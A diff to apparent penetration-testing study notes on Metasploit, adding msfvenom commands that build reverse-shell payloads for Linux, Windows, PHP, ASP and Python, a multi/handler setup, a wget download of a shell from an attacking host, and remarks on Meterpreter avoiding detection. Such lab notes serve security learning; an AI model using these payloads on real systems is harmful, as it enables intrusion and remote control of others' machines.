@@ -750,5 +750,30 @@ example
 encode
 - ``` # msfvenom -p php/meterpreter/reverse_tcp LHOST={IP} -f raw -e php/base64 ``` The PHP version of Meterpreter was encoded in Base64, and the output format was raw.
 
-Handlers
-- 
+**Handlers**
+- The term commonly used to receive a connection from a target is 'catching a shell'.
+- Can be easily caught using a handler.
+- ``` # msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php ```
+- ``` use exploit/multi/handler ``` Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.
+
+**Other Payloads**
+- Linux Executable and Linkable Format (elf)
+- ``` msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf ```
+- ``` set payload linux/x86/meterpreter/reverse_tcp ```
+- Windows
+- ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe ```
+- PHP
+- ``` msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php ```
+- ASP
+- ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp ```
+- Python
+- ``` msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py ```
+
+**transfer**
+- ``` python3 -m http.server 9000 ```
+- ``` wget http://ATTACKING_10.10.217.15:9000/shell.elf ```
+
+## Meterpreter
+-  runs in memory and does not write itself to the disk on the target, avoid detecion
+-  Meterpreter will be seen as a process and not have a file on the target system.
+-  
